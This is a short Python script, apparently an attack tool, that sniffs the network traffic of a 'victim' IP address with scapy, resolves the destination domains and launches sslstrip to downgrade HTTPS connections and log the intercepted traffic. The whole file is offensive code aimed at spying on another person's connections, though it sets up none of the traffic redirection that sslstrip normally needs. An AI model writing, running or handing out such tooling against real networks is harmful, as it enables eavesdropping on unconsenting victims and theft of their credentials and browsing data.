#!/usr/bin/env python3

import sys
import socket
import subprocess
from scapy.all import *

def resolve_ip_to_domain(ip):
    try:
        domain = socket.gethostbyaddr(ip)[0]
        return domain
    except socket.herror:
        return None

def process_packet(packet):
    if packet.haslayer(IP):
        src_ip = packet[IP].src
        dst_ip = packet[IP].dst
        
        # Check if the packet is from/to the victim IP
        if src_ip == victim_ip or dst_ip == victim_ip:
            domain = resolve_ip_to_domain(dst_ip)
            if domain:
                print(f"Packet: {src_ip} -> {dst_ip} (Domain: {domain})")
            else:
                print(f"Packet: {src_ip} -> {dst_ip} (Domain: Unknown)")

def start_sslstrip(interface):
    # Start SSLstrip as a subprocess
    print(f"Starting SSLstrip on interface {interface}")
    subprocess.Popen(["sslstrip", "-l", "10000", "-w", "sslstrip.log"])

def sniff_traffic(interface):
    print("Starting sniffer...")
    sniff(iface=interface, prn=process_packet, filter="ip", store=0)

def main():
    if len(sys.argv) < 3:
        print("Usage: sudo python3 sniffer.py <victim_ip> <interface>")
        sys.exit(1)

    global victim_ip
    victim_ip = sys.argv[1]
    interface = sys.argv[2]

    start_sslstrip(interface)
    sniff_traffic(interface)

if __name__ == "__main__":
    main()